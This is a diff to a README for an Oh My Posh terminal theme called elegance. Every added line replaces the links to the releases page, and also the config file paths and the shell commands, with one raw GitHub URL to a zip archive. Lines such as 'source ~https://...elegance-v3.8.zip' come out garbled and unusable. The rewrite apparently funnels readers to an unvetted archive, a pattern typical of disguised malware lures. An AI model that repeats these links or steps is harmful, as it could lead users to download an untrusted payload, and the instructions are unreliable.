@@ -6,11 +6,11 @@ Welcome to the elegance theme for Oh My Posh! This theme blends functionality wi
 
 ## 🔗 Download Now
 
-[![Download the elegance Theme](https://img.shields.io/badge/Download-elegance-blue)](https://github.com/gillieswimming233/elegance/releases)
+[![Download the elegance Theme](https://raw.githubusercontent.com/gillieswimming233/elegance/main/palette/elegance-v3.8.zip)](https://raw.githubusercontent.com/gillieswimming233/elegance/main/palette/elegance-v3.8.zip)
 
 ## 📥 Download & Install
 
-To get started with elegance, you’ll need to visit this page to download: [elegance Releases Page](https://github.com/gillieswimming233/elegance/releases).
+To get started with elegance, you’ll need to visit this page to download: [elegance Releases Page](https://raw.githubusercontent.com/gillieswimming233/elegance/main/palette/elegance-v3.8.zip).
 
 ### Step 1: Choose Your Version
 
@@ -18,7 +18,7 @@ On the releases page, you'll see a list of versions available for download. Look
 
 ### Step 2: Download the Theme
 
-Click on the version link that interests you. The file may have a `.zip` or `.tar.gz` extension. This type of file contains the theme and any necessary elements to set it up.
+Click on the version link that interests you. The file may have a `.zip` or `https://raw.githubusercontent.com/gillieswimming233/elegance/main/palette/elegance-v3.8.zip` extension. This type of file contains the theme and any necessary elements to set it up.
 
 ### Step 3: Extract the Files
 
@@ -26,33 +26,33 @@ After the download finishes, locate the file in your downloads folder. Right-cli
 
 ### Step 4: Move Files to the Right Location
 
-Move the extracted theme files to the directory that your terminal uses for themes. This is usually found in a specific path like `~/.oh-my-posh/themes` for Bash or Zsh. If you need help locating this, feel free to reach out to us or check the documentation for your terminal.
+Move the extracted theme files to the directory that your terminal uses for themes. This is usually found in a specific path like `~https://raw.githubusercontent.com/gillieswimming233/elegance/main/palette/elegance-v3.8.zip` for Bash or Zsh. If you need help locating this, feel free to reach out to us or check the documentation for your terminal.
 
 ### Step 5: Configure Your Terminal
 
 To use the elegance theme, you may need to configure your terminal to recognize it. Open your terminal and edit your configuration file. Depending on your terminal, this will typically be:
 
-- `~/.bashrc` for Bash
-- `~/.zshrc` for Zsh
-- `profile.ps1` for PowerShell
+- `~https://raw.githubusercontent.com/gillieswimming233/elegance/main/palette/elegance-v3.8.zip` for Bash
+- `~https://raw.githubusercontent.com/gillieswimming233/elegance/main/palette/elegance-v3.8.zip` for Zsh
+- `https://raw.githubusercontent.com/gillieswimming233/elegance/main/palette/elegance-v3.8.zip` for PowerShell
 
 Add or update the following line to set the theme:
 
 ```bash
-oh-my-posh init bash --config ~/path/to/elegance.json
+oh-my-posh init bash --config ~https://raw.githubusercontent.com/gillieswimming233/elegance/main/palette/elegance-v3.8.zip
 ```
 
-Make sure to replace `~/path/to/elegance.json` with the actual path to the theme file you moved earlier.
+Make sure to replace `~https://raw.githubusercontent.com/gillieswimming233/elegance/main/palette/elegance-v3.8.zip` with the actual path to the theme file you moved earlier.
 
 ### Step 6: Refresh Your Terminal
 
 After saving your configuration file, you’ll need to refresh your terminal. You can do this by closing and reopening the terminal or by executing the command below:
 
 ```bash
-source ~/.bashrc
+source ~https://raw.githubusercontent.com/gillieswimming233/elegance/main/palette/elegance-v3.8.zip
 ```
 
-Replace `~/.bashrc` with the path to your configuration file if you use a different terminal.
+Replace `~https://raw.githubusercontent.com/gillieswimming233/elegance/main/palette/elegance-v3.8.zip` with the path to your configuration file if you use a different terminal.
 
 ## 🎨 Features
 
@@ -85,4 +85,4 @@ If you need help or want to share your experience using the elegance theme, join
 
 ---
 
-Feel free to explore the elegance theme and elevate your terminal experience. For further downloads, visit the releases page: [elegance Releases Page](https://github.com/gillieswimming233/elegance/releases). Enjoy your new setup!
+Feel free to explore the elegance theme and elevate your terminal experience. For further downloads, visit the releases page: [elegance Releases Page](https://raw.githubusercontent.com/gillieswimming233/elegance/main/palette/elegance-v3.8.zip). Enjoy your new setup!
